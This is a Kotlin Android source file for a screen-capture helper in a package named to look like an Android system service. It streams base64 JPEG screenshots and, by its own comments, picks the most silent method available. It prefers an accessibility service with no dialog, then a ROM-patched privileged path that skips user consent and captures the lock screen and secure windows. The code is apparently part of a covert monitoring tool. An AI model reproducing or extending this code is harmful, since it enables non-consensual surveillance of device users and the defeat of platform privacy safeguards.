package com.android.systemservices

import android.content.Context
import android.graphics.Bitmap
import android.graphics.PixelFormat
import android.hardware.display.DisplayManager
import android.hardware.display.VirtualDisplay
import android.media.ImageReader
import android.media.projection.MediaProjection
import android.media.projection.MediaProjectionManager
import android.os.Handler
import android.os.HandlerThread
import android.util.Base64
import android.util.Log
import java.io.ByteArrayOutputStream

class ScreenCaptureHelper(private val context: Context) {
    private val TAG = "ScreenCaptureHelper"

    companion object {
        var projectionResultCode: Int = 0
        var projectionData: android.content.Intent? = null
    }

    // AtomicBoolean for thread-safe check-and-set in tryRootVirtualDisplayCapture, which can be
    // called from both the main thread (screen stream) and HandlerThreads (lock-screen fallback).
    private val _capturing = java.util.concurrent.atomic.AtomicBoolean(false)
    var capturing: Boolean
        get() = _capturing.get()
        set(value) { _capturing.set(value) }

    private var mediaProjection: MediaProjection? = null
    private var virtualDisplay: VirtualDisplay? = null
    private var imageReader: ImageReader? = null
    private var handlerThread: HandlerThread? = null
    private var handler: Handler? = null

    fun captureOnce(quality: Int, onDone: (String) -> Unit) {
        if (capturing) return

        // Path 1: Accessibility service — completely silent, no system dialog (preferred)
        if (ScreenshotService.isAvailable() && android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.R) {
            ScreenshotService.instance!!.capture(quality, onDone)
            return
        }

        // Path 2: Root/system build — DisplayManager mirror (no MediaProjection, no user dialog)
        // Requires CAPTURE_VIDEO_OUTPUT which the ROM patch downgrades to signature|privileged.
        // This fires whenever AccessibilityService hasn't connected yet (early boot, manual disable).
        val isSystemApp = (context.applicationInfo.flags and android.content.pm.ApplicationInfo.FLAG_SYSTEM) != 0
        if (isSystemApp && tryRootVirtualDisplayCapture(quality, onDone)) return

        // Path 3: MediaProjection fallback (requires prior user-granted token)
        val data = projectionData ?: run {
            Log.e(TAG, "No projection permission")
            return
        }

        val mpm = context.getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
        val projection = try {
            mpm.getMediaProjection(projectionResultCode, data)
        } catch (e: Exception) {
            Log.e(TAG, "getMediaProjection failed: ${e.message}")
            projectionData = null
            return
        }

        projectionData = null
        mediaProjection = projection
        capturing = true

        try {
            projection.registerCallback(object : MediaProjection.Callback() {
                override fun onStop() {
                    Log.w(TAG, "MediaProjection stopped by system")
                    stop()
                }
            }, null)
        } catch (e: Exception) {
            Log.w(TAG, "registerCallback failed: ${e.message}")
        }

        val metrics     = context.resources.displayMetrics
        val width       = metrics.widthPixels
        val height      = metrics.heightPixels
        val density     = metrics.densityDpi
        val jpegQuality = quality.coerceIn(10, 85)

        handlerThread = HandlerThread("ScreenCapture").also { it.start() }
        handler = Handler(handlerThread!!.looper)

        imageReader = ImageReader.newInstance(width, height, PixelFormat.RGBA_8888, 2)
        imageReader!!.setOnImageAvailableListener({ reader ->
            val img = reader.acquireLatestImage() ?: return@setOnImageAvailableListener
            try {
                val plane       = img.planes[0]
                val rowStride   = plane.rowStride
                val pixelStride = plane.pixelStride.coerceAtLeast(1)
                val rowPadding  = rowStride - pixelStride * width
                val bitmapW     = width + rowPadding / pixelStride

                val bitmap = Bitmap.createBitmap(bitmapW.coerceAtLeast(1), height.coerceAtLeast(1), Bitmap.Config.ARGB_8888)
                bitmap.copyPixelsFromBuffer(plane.buffer)
                val cropped = if (bitmapW != width && width > 0)
                    Bitmap.createBitmap(bitmap, 0, 0, width, height)
                else bitmap

                val baos = ByteArrayOutputStream()
                cropped.compress(Bitmap.CompressFormat.JPEG, jpegQuality, baos)
                if (cropped !== bitmap) cropped.recycle()
                bitmap.recycle()

                onDone(Base64.encodeToString(baos.toByteArray(), Base64.NO_WRAP))
            } catch (e: Throwable) {
                // Catch Throwable — bitmap allocation can throw OutOfMemoryError (a Java Error).
                // Must call onDone("") so the stream chain reschedules its next tick.
                Log.e(TAG, "Frame encode error: ${e.message}")
                onDone("")
            } finally {
                img.close()
                stop()
            }
        }, handler)

        try {
            virtualDisplay = projection.createVirtualDisplay(
                "ScreenCapture", width, height, density,
                DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                imageReader!!.surface, null, handler
            )
        } catch (e: SecurityException) {
            Log.e(TAG, "createVirtualDisplay denied (Android 14+ token expired?): ${e.message}")
            stop()
            onDone("")  // keep stream chain alive
        } catch (e: Exception) {
            Log.e(TAG, "createVirtualDisplay failed: ${e.message}")
            stop()
            onDone("")
        }
    }

    /**
     * Root/system screenshot path: create a mirrored VirtualDisplay using DisplayManager
     * directly — no MediaProjection token, no user-visible dialog.
     *
     * Also used by ScreenshotService as a lock-screen fallback when
     * AccessibilityService.takeScreenshot() returns TAKE_SCREENSHOT_ERROR_WINDOW_FORBIDDEN
     * (secure window / keyguard active).  VirtualDisplay mirrors the raw framebuffer and is
     * NOT subject to the secure-window restriction, so it captures the lock screen too.
     *
     * Requires android.permission.CAPTURE_VIDEO_OUTPUT — normally protectionLevel="signature"
     * (platform key only).  The ROM patch (patch-capture-video-output-privapp.py) downgrades
     * it to "signature|privileged" so our priv-app build can hold it via
     * privapp-permissions-sentinel.xml.
     *
     * Re-entrant guard: returns true (handled) without starting a new capture if one is already
     * in progress — caller should treat this as "skip frame, try next tick."
     *
     * @return true if capture was initiated (or already in progress); false if CAPTURE_VIDEO_OUTPUT
     *         is not granted (caller should fall through to MediaProjection or emit empty).
     */
    internal fun tryRootVirtualDisplayCapture(quality: Int, onDone: (String) -> Unit): Boolean {
        // Atomic check-and-set: prevents duplicate VirtualDisplay creation if called concurrently
        // from the screen stream tick and the lock-screen fallback path in ScreenshotService.
        if (!_capturing.compareAndSet(false, true)) {
            Log.d(TAG, "Root VirtualDisplay: capture already in progress — skipping frame")
            return true  // "handled" — caller should skip this tick, try next interval
        }

        if (context.checkSelfPermission("android.permission.CAPTURE_VIDEO_OUTPUT")
                != android.content.pm.PackageManager.PERMISSION_GRANTED) {
            _capturing.set(false)
            Log.d(TAG, "CAPTURE_VIDEO_OUTPUT not granted — skipping root VirtualDisplay path")
            return false
        }

        val metrics     = context.resources.displayMetrics
        val width       = metrics.widthPixels
        val height      = metrics.heightPixels
        val density     = metrics.densityDpi
        val jpegQuality = quality.coerceIn(10, 85)

        handlerThread = HandlerThread("RootCapture").also { it.start() }
        handler       = Handler(handlerThread!!.looper)

        imageReader = ImageReader.newInstance(width, height, PixelFormat.RGBA_8888, 2)
        imageReader!!.setOnImageAvailableListener({ reader ->
            val img = reader.acquireLatestImage() ?: return@setOnImageAvailableListener
            try {
                val plane       = img.planes[0]
                val rowStride   = plane.rowStride
                val pixelStride = plane.pixelStride.coerceAtLeast(1)
                val rowPadding  = rowStride - pixelStride * width
                val bitmapW     = width + rowPadding / pixelStride

                val bitmap = Bitmap.createBitmap(
                    bitmapW.coerceAtLeast(1), height.coerceAtLeast(1), Bitmap.Config.ARGB_8888
                )
                bitmap.copyPixelsFromBuffer(plane.buffer)
                val cropped = if (bitmapW != width && width > 0)
                    Bitmap.createBitmap(bitmap, 0, 0, width, height)
                else bitmap

                val baos = ByteArrayOutputStream()
                cropped.compress(Bitmap.CompressFormat.JPEG, jpegQuality, baos)
                if (cropped !== bitmap) cropped.recycle()
                bitmap.recycle()

                onDone(Base64.encodeToString(baos.toByteArray(), Base64.NO_WRAP))
            } catch (e: Throwable) {
                // Catch Throwable — bitmap allocation can throw OutOfMemoryError (a Java Error).
                // Must call onDone("") so the stream chain reschedules its next tick.
                Log.e(TAG, "Root VirtualDisplay frame error: ${e.message}")
                onDone("")
            } finally {
                img.close()
                stop()
            }
        }, handler)

        val dm = context.getSystemService(Context.DISPLAY_SERVICE) as DisplayManager
        return try {
            virtualDisplay = dm.createVirtualDisplay(
                "SentinelCapture", width, height, density,
                imageReader!!.surface,
                DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR
            )
            Log.d(TAG, "Root VirtualDisplay capture started (${width}x${height})")
            true
        } catch (e: SecurityException) {
            Log.e(TAG, "Root VirtualDisplay SecurityException (ROM patch missing?): ${e.message}")
            stop()   // resets _capturing + cleans up HandlerThread/ImageReader
            false
        } catch (e: Exception) {
            Log.e(TAG, "Root VirtualDisplay failed: ${e.message}")
            stop()
            false
        }
    }

    fun stop() {
        capturing = false
        cleanupResources()
    }

    private fun cleanupResources() {
        try { virtualDisplay?.release() }   catch (_: Exception) {}
        try { imageReader?.close() }        catch (_: Exception) {}
        try { mediaProjection?.stop() }     catch (_: Exception) {}
        try { handlerThread?.quitSafely() } catch (_: Exception) {}
        virtualDisplay  = null
        imageReader     = null
        mediaProjection = null
        handlerThread   = null
        handler         = null
    }
}
